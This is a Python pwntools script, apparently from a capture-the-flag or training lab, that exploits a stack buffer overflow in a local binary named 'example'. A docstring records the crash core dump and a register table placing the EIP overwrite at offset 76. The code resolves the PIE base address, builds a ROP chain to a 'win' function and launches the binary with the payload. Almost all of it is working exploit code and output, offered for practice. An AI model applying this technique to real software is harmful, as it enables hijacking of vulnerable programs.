#!/usr/bin/env python3
"""
NOW
...
trying i=99
[+] Starting local process './example': pid 116
[*] Process './example' stopped with exit code -11 (SIGSEGV) (pid 116)
[+] Parsing corefile...: Done
[*] '/tmp/core.example.116'
    Arch:      i386-32-little
    EIP:       0x61616174
    ESP:       0xffffdc50
    Exe:       '/app/example' (0x56555000)
    Fault:     0x61616174
+----------+------------+---------------+-------------+
| register | hex value  | decimal value | cyclic_find |
+----------+------------+---------------+-------------+
| orig_eax | 0xffffffff | 4294967295    | -1          |
| ecx      | 0xffffdec0 | 4294958784    | -1          |
| esi      | 0xffffdc90 | 4294958224    | -1          |
| edx      | 0xffffdc5f | 4294958175    | -1          |
| esp      | 0xffffdc50 | 4294958160    | -1          |
| eax      | 0xffffdc00 | 4294958080    | -1          |
| edi      | 0xf7ffcb80 | 4160736128    | -1          |
| eip      | 0x61616174 | 1633771892    | 76          |
| ebp      | 0x61616173 | 1633771891    | 72          |
| ebx      | 0x61616172 | 1633771890    | 68          |
| eflags   | 0x10286    | 66182         | -1          |
| xgs      | 0x63       | 99            | -1          |
| xds      | 0x2b       | 43            | -1          |
| xes      | 0x2b       | 43            | -1          |
| xss      | 0x2b       | 43            | -1          |
| xcs      | 0x23       | 35            | -1          |
| xfs      | 0x0        | 0             | -1          |
+----------+------------+---------------+-------------+
"""

import sys
from pwn import *
from itertools import cycle

elf = ELF("./example")

with elf.process() as p:
    # To compensate for PIE, we must know the offset at runtime.
    base_address = p.libs()['/app/example']
    # Then, we ensure our functions are offset by that amount.
    elf.address = base_address

# Now, we can create our attack.
## --------------
rop = ROP(elf)
rop.win()


offset = 76 # This needs to be the offset for eip
## --------------

payload = flat({
    offset: rop.chain()
})

print("ropchain:")
print(rop.dump())
print("payload:")
print(rop.chain())

with elf.process([payload]) as p:
    p.interactive()

